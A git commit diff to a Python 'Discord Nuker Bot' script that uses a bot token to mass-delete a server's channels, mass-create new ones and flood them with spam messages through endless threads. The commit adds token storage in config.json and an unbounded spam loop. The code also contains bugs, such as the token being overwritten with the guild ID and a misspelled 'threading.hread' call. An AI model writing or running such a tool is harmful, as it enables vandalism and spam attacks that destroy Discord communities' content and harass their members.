7449a00142ce8d29429a0b454e2abe6f208f7a6e
palblo <100297632+palblo@users.noreply.github.com>
2022-05-27 23:22:44 +0200

    Update main.py

--- DiscordNuker/main.py
+++ DiscordNuker/main.py
@@ -1,19 +1,30 @@
-import requests, os, random, json, sys
+import requests, os, random, json, sys, threading
 from pystyle import Colors, Colorate, Write
-from threading import Thread
 from time import sleep
 
-os.system("title DISCORD NUKER BOT  :  V1  :  SETUP")
-print(Colorate.Horizontal(Colors.purple_to_red, '''
+try: 
+    with open('config.json') as config_file:
+        configdata = json.load(config_file)
+    bot_token = configdata['bot_token']
+    bot_token = configdata['guild_id']
+    os.system("title DISCORD NUKER BOT  :  V1  :  SETUP")
+    print(Colorate.Horizontal(Colors.purple_to_red, '''
 ┌┐┌┬ ┬┬┌─┌─┐  ┌┐ ┌─┐┌┬┐
 ││││ │├┴┐├┤   ├┴┐│ │ │ 
 ┘└┘└─┘┴ ┴└─┘  └─┘└─┘ ┴ By Pąblo#4316
 
 Pąblo#4316 | https://github.com/palblo/DiscordNukeBot/
 '''))
-print(Colorate.Vertical(Colors.red_to_white, 'VERSION: V1.0'))
-bot_token = Write.Input(f"\nbot token -> ", Colors.blue_to_purple, interval=0.00005)
-guild_id = Write.Input(f"guild id -> ", Colors.blue_to_purple, interval=0.00005)
+except:
+    bot_token = Write.Input(f"\nBOT TOKEN -> ", Colors.blue_to_purple, interval=0.00005)
+    guild_id = Write.Input(f"\nGUILD ID -> ", Colors.blue_to_purple, interval=0.00005)
+    jsondata = {
+        "bot_token" : bot_token,
+        "guild_id" : guild_id
+        }
+    savejson = json.dumps(jsondata)
+    with open('config.json', 'w') as config_file:
+        config_file.write(savejson)
 
 def main():
     os.system('cls')
@@ -29,13 +40,12 @@ Pąblo#4316 | https://github.com/palblo/DiscordNukeBot/
 
     print(Colorate.Vertical(Colors.red_to_white, '''
 VERSION: V1.0
-┌─────────────────────┐
-│1 = SPAM             │
-│2 = DELETE CHANNELS  │
-│3 = CREATE CHANNELS  │
-│4 = FULL NUKE        │
-└─────────────────────┘
-
+┌─────────┐
+│1 = SPAM └──────────┐
+│2 = DELETE CHANNELS │
+│3 = CREATE CHANNELS │
+│4 = FULL NUKE ┌─────┘
+└──────────────┘
     '''))
 
     action = Write.Input(f"action -> ", Colors.blue_to_purple, interval=0.00005)
@@ -52,60 +62,63 @@ VERSION: V1.0
         r = requests.post(f"https://discord.com/api/v9/guilds/{guild_id}/channels", json={"name": channelname, "permission_overwrites": [], "type": 0}, headers=header)
 
     if action == '1':
-        def tstop(self):
-          self._stop_event.set()
         os.system("title DISCORD NUKER BOT  :  V1  :  SPAM")
         channel_ids = requests.get(f"https://discord.com/api/v9/guilds/{guild_id}/channels", headers=header)
         channels_id = [channel['id'] for channel in json.loads(channel_ids.text)]
         print(Colorate.Horizontal(Colors.purple_to_red, '\nyou have selected SPAM', 1))
-        message = Write.Input(f"\nmessage -> ", Colors.blue_to_purple, interval=0.00005)
+        message = Write.Input(f"\nMESSAGE -> ", Colors.blue_to_purple, interval=0.00005)
         payload = {
             "content": message
         }
         print(Colorate.Horizontal(Colors.green_to_red, f'\n[INFO] Press ctrl+c to close', 1))
-        for channels in channel_ids:
-            t = Thread(target=SpamRequest).start()
+        try:
+         while True:
+             t = threading.Thread(target=SpamRequest).start()
+        except KeyboardInterrupt:
+             os.system("python main.py") 
+             exit()           
 
     if action == '2':
         os.system("title DISCORD NUKER BOT  :  V1  :  DELETE CHANNELS")
         channel_ids = requests.get(f"https://discord.com/api/v9/guilds/{guild_id}/channels", headers=header)
         channel_id = [channel['id'] for channel in json.loads(channel_ids.text)]
-        print(Colorate.Horizontal(Colors.purple_to_red, '\n[SELECT] you have selected DELETE CHANNELS', 1))
+        print(Colorate.Horizontal(Colors.purple_to_red, '\n[SELECT] You have selected DELETE CHANNELS', 1))
         sleep(1)
         print(Colorate.Horizontal(Colors.purple_to_red, '\n[LOG] Delenting channels...', 1))
         for channel_id in channel_id:
-            Thread(target=DeleteChannel).start()
+            threading.Thread(target=DeleteChannel).start()
         print(Colorate.Horizontal(Colors.green_to_red, f'\n[INFO] Done', 1))
         sleep(3)
         main()   
 
     if action == '3':
         os.system("title DISCORD NUKER BOT  :  V1  :  CREATE CHANNELS")
-        print(Colorate.Horizontal(Colors.purple_to_red, 'you have selected CREATE CHANNELS', 1))
-        channelname = Write.Input(f"channels name -> ", Colors.blue_to_purple, interval=0.00005)
-        channelsamount = int(Write.Input(f"how many channels? -> ", Colors.blue_to_purple, interval=0.00005))
+        print(Colorate.Horizontal(Colors.purple_to_red, 'You have selected CREATE CHANNELS', 1))
+        channelname = Write.Input(f"CHANNELS NAME -> ", Colors.blue_to_purple, interval=0.00005)
+        channelsamount = int(Write.Input(f"HOW MANY CHANNELS? -> ", Colors.blue_to_purple, interval=0.00005))
         sleep(1)
         print(Colorate.Horizontal(Colors.purple_to_red, f'[LOG] Creating {channelsamount} channels...', 1))
         for i in range(channelsamount):
-            Thread(target=CreateChannel).start()
+            threading.Thread(target=CreateChannel).start()
         print(Colorate.Horizontal(Colors.green_to_red, f'\n[INFO] Done', 1))
         sleep(3)
         main()   
 
     if action == '4':
         os.system("title DISCORD NUKER BOT  :  V1  :  FULL NUKE")
-        print(Colorate.Horizontal(Colors.purple_to_red, '\n[SELECT] you have selected FULL NUKE'))
-        channelname = Write.Input(f"\nchannels name -> ", Colors.blue_to_purple, interval=0.00005)
-        message = Write.Input(f"message -> ", Colors.blue_to_purple, interval=0.00005)
+        print(Colorate.Horizontal(Colors.purple_to_red, '\n[SELECT] You have selected FULL NUKE'))
+        channelsamount = int(Write.Input(f"\nHOW MANY CHANNELS? -> ", Colors.blue_to_purple, interval=0.00005))
+        channelname = Write.Input(f"CHANNELS NAME -> ", Colors.blue_to_purple, interval=0.00005)
+        message = Write.Input(f"MESSAGE -> ", Colors.blue_to_purple, interval=0.00005)
         channel_ids = requests.get(f"https://discord.com/api/v9/guilds/{guild_id}/channels", headers=header)
         channel_id = [channel['id'] for channel in json.loads(channel_ids.text)]
-        print(Colorate.Horizontal(Colors.purple_to_red, f'\n[LOG] delenting all channels...', 1))
+        print(Colorate.Horizontal(Colors.purple_to_red, f'\n[LOG] Delenting all channels...', 1))
         for channel_id in channel_id:
-            Thread(target=DeleteChannel).start()
+            threading.Thread(target=DeleteChannel).start()
         sleep(3)
-        print(Colorate.Horizontal(Colors.purple_to_red, f'[LOG] creating 50 channels...', 1))
-        for i in range(50):
-            Thread(target=CreateChannel).start()
+        print(Colorate.Horizontal(Colors.purple_to_red, f'[LOG] Creating ' + str(channelsamount) + ' channels...', 1))
+        for i in range(channelsamount):
+            threading.hread(target=CreateChannel).start()
         payload = {
             "content": message
         }
@@ -113,7 +126,11 @@ VERSION: V1.0
         channels_id = [channel['id'] for channel in json.loads(channel_ids.text)]
         print(Colorate.Horizontal(Colors.purple_to_red, f'[LOG] Spamming', 1))
         print(Colorate.Horizontal(Colors.green_to_red, f'\n[INFO] Press ctrl+c to close', 1))
-        while True:
-            Thread(target=SpamRequest).start()
+        try:
+          while True:
+                threading.Thread(target=SpamRequest).start()
+        except KeyboardInterrupt:
+             os.system("python main.py") 
+             exit()    
 
-main()    
+main()       
